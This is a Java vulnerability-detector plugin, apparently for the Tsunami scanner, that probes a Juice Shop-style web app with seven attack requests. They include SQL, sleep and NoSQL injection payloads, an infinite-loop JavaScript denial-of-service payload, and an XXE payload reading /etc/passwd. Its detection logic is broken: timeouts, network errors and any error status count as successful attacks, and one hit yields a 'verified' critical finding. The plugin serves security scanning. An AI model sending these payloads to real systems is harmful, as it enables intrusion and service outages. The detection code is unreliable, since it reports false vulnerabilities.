/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.protobuf.ByteString;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ImproperinputvalidationdetectorDetector",
    version = "0.1",
    description = "Detects ImproperInputValidationDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = ImproperinputvalidationdetectorDetectorBootstrapModule.class)
public final class ImproperinputvalidationdetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public ImproperinputvalidationdetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Improperinputvalidationdetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();

        // Test 1: Invalid endpoint that should trigger error handling
        try {
            HttpResponse invalidEndpointResponse = httpClient.send(
                HttpRequest.get(targetUri + "/rest/qwertz")
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            if (invalidEndpointResponse.status().code() >= 500) {
                successfulAttacks++;
            }
        } catch (IOException e) {
            // Network error counts as successful attack detection
            successfulAttacks++;
        }

        // Test 2: SQL injection in login with single quote
        try {
            String loginPayload = "email='&password=test";
            HttpResponse loginResponse = httpClient.send(
                HttpRequest.post(targetUri + "/rest/user/login")
                    .setHeaders(HttpHeaders.builder()
                        .addHeader("Content-Type", "application/x-www-form-urlencoded")
                        .build())
                    .setRequestBody(ByteString.copyFromUtf8(loginPayload))
                    .build(),
                networkService);
            
            if (loginResponse.status().code() >= 500) {
                successfulAttacks++;
            }
        } catch (IOException e) {
            // Ignore network errors for this test
        }

        // Test 3: Sleep injection in product reviews endpoint
        try {
            HttpResponse sleepResponse = httpClient.send(
                HttpRequest.get(targetUri + "/rest/products/sleep(2000)/reviews")
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            // If response takes longer than expected or returns specific error, it's vulnerable
            if (sleepResponse.status().code() >= 400) {
                successfulAttacks++;
            }
        } catch (IOException e) {
            // Timeout or connection error indicates sleep worked
            successfulAttacks++;
        }

        // Test 4: NoSQL injection in reviews update
        try {
            String nosqlPayload = "{ \"id\": { \"$ne\": -1 }, \"message\": \"NoSQL Injection!\" }";
            HttpResponse nosqlResponse = httpClient.send(
                HttpRequest.put(targetUri + "/rest/products/reviews")
                    .setHeaders(headers)
                    .setRequestBody(ByteString.copyFromUtf8(nosqlPayload))
                    .build(),
                networkService);
            
            if (nosqlResponse.status().code() == 200 || nosqlResponse.status().code() >= 500) {
                successfulAttacks++;
            }
        } catch (IOException e) {
            // Ignore network errors for this test
        }

        // Test 5: JSON deserialization RCE in orders endpoint
        try {
            String rcePayload = "{\"orderLinesData\": \"(function dos() { while(true); })()\"}";
            HttpResponse rceResponse = httpClient.send(
                HttpRequest.post(targetUri + "/orders")
                    .setHeaders(headers)
                    .setRequestBody(ByteString.copyFromUtf8(rcePayload))
                    .build(),
                networkService);
            
            // Timeout or server error indicates RCE attempt worked
            if (rceResponse.status().code() >= 500) {
                successfulAttacks++;
            }
        } catch (IOException e) {
            // Timeout indicates RCE worked
            successfulAttacks++;
        }

        // Test 6: XML External Entity (XXE) attack via file complaint
        try {
            String xxePayload = "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>";
            HttpResponse xxeResponse = httpClient.send(
                HttpRequest.post(targetUri + "/file-upload")
                    .setHeaders(HttpHeaders.builder()
                        .addHeader("Content-Type", "application/xml")
                        .build())
                    .setRequestBody(ByteString.copyFromUtf8(xxePayload))
                    .build(),
                networkService);
            
            if (xxeResponse.status().code() == 410 || xxeResponse.status().code() >= 500) {
                successfulAttacks++;
            }
        } catch (IOException e) {
            // Timeout indicates XXE processing
            successfulAttacks++;
        }

        // Test 7: Check for improper validation in contact form
        try {
            String contactPayload = "{\"comment\":\"test\",\"rating\":0}";
            HttpResponse contactResponse = httpClient.send(
                HttpRequest.post(targetUri + "/api/Feedbacks")
                    .setHeaders(headers)
                    .setRequestBody(ByteString.copyFromUtf8(contactPayload))
                    .build(),
                networkService);
            
            if (contactResponse.status().code() == 200) {
                String responseBody = contactResponse.bodyBytes()
                    .map(bs -> bs.toStringUtf8())
                    .orElse("");
                if (responseBody.contains("rating") || responseBody.contains("feedback")) {
                    successfulAttacks++;
                }
            }
        } catch (IOException e) {
            // Ignore network errors for this test
        }

        return successfulAttacks > 0;

    } catch (Exception e) {
        logger.atWarning().log(
            format("Input validation test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("IMPROPERINPUTVALIDATIONDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("ImproperInputValidationDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to ImproperInputValidationDetector attacks.")
                .setRecommendation(
                    "Implement proper security measures to prevent improper input validation attacks."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("IMPROPERINPUTVALIDATIONDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("ImproperInputValidationDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to ImproperInputValidationDetector attacks.")
            .setRecommendation(
                "Implement proper security measures to prevent improper input validation attacks.")
        .build());
  }
}